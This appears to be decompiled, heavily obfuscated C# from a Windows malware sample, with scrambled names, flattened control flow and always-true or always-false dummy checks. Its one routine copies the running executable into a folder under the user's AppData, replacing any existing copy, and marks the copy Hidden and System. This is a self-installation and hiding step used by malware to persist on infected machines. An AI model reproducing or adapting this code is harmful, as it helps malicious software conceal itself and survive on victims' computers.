using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using YntkCmRvu3wTEtF9OJ;

namespace mi6CSAjH1b7MB3xMp9;

[StandardModule]
internal sealed class lprkL1aPx5mcXEdXcx
{
	public static void PVHYdMPlY()
	{
		_ = 1;
		if (bFNPlX8oPtqkYKE1YY())
		{
			if (!KBhx9fJT9GZouRf3o7())
			{
				goto IL_01f7;
			}
			switch (2)
			{
			default:
				return;
			case 0:
			case 3:
				break;
			case 1:
			case 2:
				goto IL_01f7;
			case 4:
				return;
			}
		}
		int try003d_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num4 = default(int);
		string edpZVcNIgx = default(string);
		string object_ = default(string);
		string text = default(string);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num3;
				switch (try003d_dispatch)
				{
				default:
					goto IL_003d_2;
				case 431:
					{
						num2 = num;
						num3 = 9;
						if (KBhx9fJT9GZouRf3o7())
						{
							goto IL_00f4;
						}
						goto IL_018a;
					}
					IL_003d_2:
					ProjectData.ClearProjectError();
					num4 = -2;
					goto IL_017d;
					IL_017d:
					num = 2;
					goto IL_0175;
					IL_0175:
					edpZVcNIgx = EkWM3SuPulRFvZGJal.edpZVcNIgx;
					goto IL_016a;
					IL_016a:
					num = 3;
					object_ = (string)JxfPdhK9YiCM2hNB6A();
					goto IL_0165;
					IL_0165:
					num = 4;
					goto IL_013f;
					IL_013f:
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + EkWM3SuPulRFvZGJal.eSkZTvvyby + "\\" + edpZVcNIgx;
					num3 = 15;
					if (!bFNPlX8oPtqkYKE1YY())
					{
						goto IL_00f4;
					}
					goto end_IL_003d;
					IL_00f4:
					while (true)
					{
						switch (num3)
						{
						case 16:
						{
							int num5 = num2 + 1;
							num2 = 0;
							switch (num5)
							{
							case 1:
								break;
							case 5:
								goto IL_008f;
							case 6:
								goto IL_0094;
							case 4:
								goto IL_0165;
							case 3:
								goto IL_016a;
							case 2:
								goto IL_017d;
							case 7:
								goto IL_018e;
							case 8:
							case 9:
								goto IL_0197;
							case 10:
								goto end_IL_003d_2;
							case 11:
							case 12:
								goto end_IL_003d;
							default:
								goto IL_01e8;
							}
							goto IL_003d_2;
						}
						case 15:
							goto IL_008f;
						case 14:
							if (flag2)
							{
								goto IL_0094;
							}
							goto end_IL_003d;
						case 10:
							flag2 = rbEjCCAAVSvMJLZnbR(object_);
							goto case 14;
						case 9:
							if (num4 > -2)
							{
								switch (num4)
								{
								case 1:
									break;
								default:
									goto IL_01e8;
								}
							}
							goto case 16;
						default:
							num3 = 14;
							if (!bFNPlX8oPtqkYKE1YY())
							{
							}
							continue;
						case 13:
							break;
						case 5:
							goto IL_0165;
						case 6:
							goto IL_016a;
						case 1:
							goto IL_0175;
						case 7:
							goto IL_017d;
						case 8:
						case 11:
							goto IL_018a;
						case 2:
							goto IL_018e;
						case 4:
							goto IL_019b;
						case 0:
							goto end_IL_003d_2;
						case 3:
						case 12:
							goto end_IL_003d;
							IL_0094:
							num = 6;
							flag = rbEjCCAAVSvMJLZnbR(text);
							_ = 0;
							if (!KBhx9fJT9GZouRf3o7())
							{
								num3 = 3;
								if (KBhx9fJT9GZouRf3o7())
								{
									continue;
								}
								goto case 10;
							}
							goto IL_018a;
							IL_008f:
							num = 5;
							goto case 10;
						}
						break;
					}
					goto IL_013f;
					IL_018a:
					if (flag)
					{
						goto IL_018e;
					}
					goto IL_0197;
					IL_018e:
					num = 7;
					File.Delete(text);
					goto IL_0197;
					IL_0197:
					num = 9;
					goto IL_019b;
					IL_019b:
					n4EBlij6lv1flK3iW7(object_, text);
					break;
					end_IL_003d_2:
					break;
				}
				num = 10;
				zKPIl5CGKD9gL2XGXC(text, FileAttributes.Hidden | FileAttributes.System);
				end_IL_003d:;
			}
			catch (object obj) when (obj is Exception && num4 != 0 && num2 == 0)
			{
				uw0FOkRWle1jCxZTYR((Exception)obj);
				try003d_dispatch = 431;
				continue;
			}
			break;
			IL_01e8:
			throw EE7qwRPcTuJUKuYYDP(-2146828237);
		}
		if (num2 == 0)
		{
			return;
		}
		goto IL_01f7;
		IL_01f7:
		YFgJ2ea1ATqqX5hNHk();
	}

	internal static object JxfPdhK9YiCM2hNB6A()
	{
		return Application.get_ExecutablePath();
	}

	internal static bool rbEjCCAAVSvMJLZnbR(object object_0)
	{
		return File.Exists((string?)object_0);
	}

	internal static void n4EBlij6lv1flK3iW7(object object_0, object object_1)
	{
		File.Copy((string)object_0, (string)object_1);
	}

	internal static void zKPIl5CGKD9gL2XGXC(object object_0, FileAttributes fileAttributes_0)
	{
		File.SetAttributes((string)object_0, fileAttributes_0);
	}

	internal static void uw0FOkRWle1jCxZTYR(object object_0)
	{
		ProjectData.SetProjectError((Exception)object_0);
	}

	internal static object EE7qwRPcTuJUKuYYDP(int int_0)
	{
		return ProjectData.CreateProjectError(int_0);
	}

	internal static void YFgJ2ea1ATqqX5hNHk()
	{
		ProjectData.ClearProjectError();
	}

	internal static bool KBhx9fJT9GZouRf3o7()
	{
		return true;
	}

	internal static bool bFNPlX8oPtqkYKE1YY()
	{
		return false;
	}
}
